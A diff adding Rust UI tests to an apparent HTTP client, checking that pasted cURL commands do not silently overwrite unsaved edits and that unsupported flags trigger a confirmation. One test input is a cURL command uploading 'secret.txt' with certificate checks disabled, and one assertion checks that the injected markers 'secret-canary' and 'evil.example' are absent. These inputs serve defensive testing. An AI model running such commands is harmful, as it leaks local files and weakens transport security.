+        let disk_json =
+            std::fs::read_to_string(root.path().join(&project_id).join("project.json")).unwrap();
+        assert!(!disk_json.contains("secret-canary"));
+        assert!(!disk_json.contains("evil.example"));
+        let disk_project = store.load(&project_id).unwrap();
+        let disk_req = disk_project.find_request(&request_id).unwrap();
+        assert_eq!(disk_req.url, "https://example.com/original");
+        assert_eq!(disk_req.method, "POST");
+    }
+
+    #[test]
+    fn curl_paste_on_dirty_draft_requires_confirmation_and_preserves_edits_until_confirmed() {
+        run_view_test(check_curl_paste_on_dirty_draft);
+    }
+
+    fn check_curl_paste_on_dirty_draft() {
+        let mut cx = TestAppContext::single();
+        let root = tempfile::tempdir().unwrap();
+        let store = ProjectStore::at(root.path());
+        seed_request(&store);
+        cx.update(gpui_kit::init);
+        let (window, view) = cx
+            .update(|cx| {
+                gpui_kit::open_window(Default::default(), cx, |window, cx| {
+                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
+                })
+            })
+            .unwrap();
+
+        cx.update_window(window, |_, window, cx| {
+            view.update(cx, |view, cx| {
+                view.body_kind = 1;
+                view.body_editor
+                    .update(cx, |ed, cx| ed.set_value(r#"{"draft":1}"#, window, cx));
+                view.append_header_preset("X-Draft", "yes", window, cx);
+                view.timeout
+                    .update(cx, |t, cx| t.replace_all("4500", window, cx));
+                assert!(view.dirty);
+
+                // Pasting a plain GET cURL command must not wipe unsaved edits silently.
+                view.url.update(cx, |input, cx| {
+                    input.replace_all("curl https://example.com/plain", window, cx);
+                });
+            });
+        })
+        .unwrap();
+
+        cx.update_window(window, |_, window, cx| {
+            view.update(cx, |view, cx| {
+                assert_eq!(view.url.read(cx).value().as_ref(), "");
+                assert!(view.dirty);
+                assert_eq!(view.body_kind, 1);
+                assert_eq!(view.body_editor.read(cx).value().as_ref(), r#"{"draft":1}"#);
+                assert_eq!(view.headers_active_count, 1);
+                assert_eq!(view.timeout.read(cx).value().as_ref(), "4500");
+
+                let confirm = view
+                    .active_curl_confirm
+                    .as_ref()
+                    .and_then(|w| w.upgrade())
+                    .expect("replacement confirmation dialog should open");
+                assert!(confirm.read(cx).replace_summary.is_some());
+
+                // Explicitly confirming replacement updates the draft.
+                view.apply_confirmed_curl_view(&confirm, window, cx);
+                assert_eq!(
+                    view.url.read(cx).value().as_ref(),
+                    "https://example.com/plain"
+                );
+                assert_eq!(view.body_kind, 0);
+                assert_eq!(view.headers_active_count, 0);
+                assert_eq!(view.timeout.read(cx).value().as_ref(), "30000");
+            });
+        })
+        .unwrap();
+    }
+
+    #[test]
+    fn curl_paste_with_unsupported_flags_prompts_before_applying() {
+        run_view_test(check_curl_paste_unsupported_flags);
+    }
+
+    fn check_curl_paste_unsupported_flags() {
+        let mut cx = TestAppContext::single();
+        let root = tempfile::tempdir().unwrap();
+        let store = ProjectStore::at(root.path());
+        seed_request(&store);
+        cx.update(gpui_kit::init);
+        let (window, view) = cx
+            .update(|cx| {
+                gpui_kit::open_window(Default::default(), cx, |window, cx| {
+                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
+                })
+            })
+            .unwrap();
+
+        cx.update_window(window, |_, window, cx| {
+            view.update(cx, |view, cx| {
+                view.url.update(cx, |input, cx| {
+                    input.replace_all(
+                        "curl --form file=@secret.txt -k https://example.com/upload",
+                        window,
+                        cx,
+                    );
+                });
+            });
+        })
+        .unwrap();
+
+        cx.update_window(window, |_, _, cx| {
+            let v = view.read(cx);
+            assert_eq!(v.url.read(cx).value().as_ref(), "");
+            assert!(!v.dirty);
+            let confirm = v
+                .active_curl_confirm
+                .as_ref()
+                .and_then(|w| w.upgrade())
+                .expect("unsupported flags should trigger confirmation before applying");
+            assert_eq!(
+                confirm.read(cx).report.unsupported_flags,
+                vec!["--form".to_string(), "-k".to_string()]
+            );
+        })
+        .unwrap();
     }
 }
